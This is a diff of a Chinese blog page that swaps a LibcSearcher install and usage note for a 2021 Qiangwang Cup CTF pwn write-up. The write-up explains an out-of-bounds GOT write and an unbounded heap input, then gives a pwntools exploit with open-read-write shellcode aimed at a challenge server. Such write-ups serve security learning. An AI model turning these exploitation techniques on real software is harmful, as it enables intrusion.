@@ -6,13 +6,13 @@
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>LibcSearcher - ShouCheng</title>
+  <title>2021强网杯PWN - ShouCheng</title>
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta name="google" content="notranslate" />
   
-  <meta name="description" content="LibcSearcher1、安装
-123git clo...">
+  <meta name="description" content="复现来源：
+https://blog.csdn.net...">
   <meta name="author" content="ShouCheng">
   <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
   <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
@@ -148,7 +148,7 @@
         <i class="iconfont iconsearch j-navbar-search"></i>
       
     </div>
-    <div class="center">LibcSearcher</div>
+    <div class="center">2021强网杯PWN</div>
     <div class="right">
       <i class="iconfont iconmenu j-navbar-menu"></i>
     </div>
@@ -192,45 +192,50 @@
     <section class="head">
   <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
   <div class="head-mask">
-    <h1 class="head-title">LibcSearcher</h1>
+    <h1 class="head-title">2021强网杯PWN</h1>
     <div class="head-info">
-      <span class="post-info-item"><i class="iconfont iconcalendar"></i>December 05, 2020</span>
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 14, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>412</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1748</span>
     </div>
   </div>
 </section>
     <section class="main">
       <section class="content">
-        <h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>1、安装</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs linux">git clone https://github.com/lieanu/LibcSearcher.git<br>cd LibcSearcher<br>python setup.py develop<br></code></pre></td></tr></table></figure>
+        <p>复现来源：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/eeeeeight/article/details/118006138">https://blog.csdn.net/eeeeeight/article/details/118006138</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1839670">https://cloud.tencent.com/developer/article/1839670</a></p>
+<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p><img   class="lazyload" data-original="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914154341329.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210914154341329</span></p>
+<p>checksec一下，64位，堆栈可执行</p>
+<p>进入IDA，只存在申请和释放堆块的功能，其中，申请最多两次，释放只有一次。</p>
+<p><img   class="lazyload" data-original="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155156145.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210914155156145</span></p>
+<p><img   class="lazyload" data-original="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155132957.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210914155132957</span></p>
+<p>首先，没有检查索引下限，所以存在数组越界，可以越界到got表。然后输入函数中，如果我们在输入size时，直接输入’\n’，将会让size直接为0，而如果size为0了，在往堆里面输入数据是就可以无限输入，因为在检验那里，buf一旦获得跟ptr一样的地址，而buf又要先自加，才就会导致一直都将大于ptr，验证一直都是没有问题的</p>
+<p><img   class="lazyload" data-original="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155508246.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210914155508246</span></p>
+<p>程序有沙箱，所以就是orw。加上前面发现的漏洞点，结合起来就是，通过数组越界，将堆块指针写入到函数的got表里面，然后因为无限输入，堆块又可执行，所以往堆块里面写入shellcode，最后就是调用被修改函数，转而去执行shellcode来读取flag</p>
+<p>然后呢，本地复现不了，暂时不知道该怎么让文件去链接上题目给的seccomp文件，所以只能讲讲思路</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#sh=process(&#x27;./orw&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>libc=elf.libc<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br>    shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    mov rdi, 0x67616c662f2e</span><br><span class="hljs-string">    push rdi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdx, 0x100</span><br><span class="hljs-string">    mov rsi, rdi</span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    mov rax, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;index:&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;-25&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;size:&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;content:&#x27;</span>)<br>    sh.sendline(asm(shellcode))<br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.interactive()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        sh=process(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>        sh=remote(<span class="hljs-string">&#x27;39.105.131.68&#x27;</span>,<span class="hljs-number">12354</span>)<br>   <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            sh.close()<br></code></pre></td></tr></table></figure>
 
-<p>2、错误：</p>
-<p><img   class="lazyload" data-original="2020-12-05-LibcSearcher.assets/2020101521162965.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p>处理办法：</p>
-<p><img   class="lazyload" data-original="2020-12-05-LibcSearcher.assets/20201015211718534.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p>3、常见用法（脚本中使用）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from LibcSearcher import *<br>libc=LibcSearcher(&#x27;puts&#x27;,puts_addr（指的是got表地址）)<br>libc_base=puts_addr-libc.dump(&#x27;puts&#x27;)<br>system_addr=libc_base+libc.dump(&#x27;system&#x27;)<br>binsh_addr=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)<br></code></pre></td></tr></table></figure>
-
-<p>以上内容转载<a target="_blank" rel="noopener" href="https://blog.csdn.net/yongbaoii/article/details/109105721">LibcSearcher 安装 错误处理 与使用</a></p>
-
+<h2 id><a href="#" class="headerlink" title></a></h2>
       </section>
       <section class="extra">
         
           <ul class="copyright">
   
     <li><strong>本文作者：</strong>ShouCheng</li>
-    <li><strong>本文链接：</strong><a href="http://example.com/2020/12/05/2020-12-05-LibcSearcher/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2020&#x2F;12&#x2F;05&#x2F;2020-12-05-LibcSearcher&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2020&#x2F;12&#x2F;05&#x2F;2020-12-05-LibcSearcher&#x2F;index.html</a></li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;09&#x2F;14&#x2F;2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;09&#x2F;14&#x2F;2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN&#x2F;index.html</a></li>
     <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
   
 </ul>
         
         
         
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/" rel="tag">强网杯</a></li></ul> 
+
         
   <nav class="nav">
-    <a href="/2020/12/10/2020-12-10-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"><i class="iconfont iconleft"></i>整数溢出</a>
-    <a href="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">格式化字符串漏洞<i class="iconfont iconright"></i></a>
+    <a href="/2021/09/17/2021-09-17-ptmalloc-%E7%AC%94%E8%AE%B0/"><i class="iconfont iconleft"></i>ptmalloc--笔记</a>
+    <a href="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/">2021羊城杯PWN<i class="iconfont iconright"></i></a>
   </nav>
 
       </section>
@@ -250,7 +255,7 @@
           
   <aside class="toc-wrap">
     <h3 class="toc-title">文章目录：</h3>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#LibcSearcher"><span class="toc-text">LibcSearcher</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#orw"><span class="toc-text">orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"></span></a></li></ol>
   </aside>
 
         
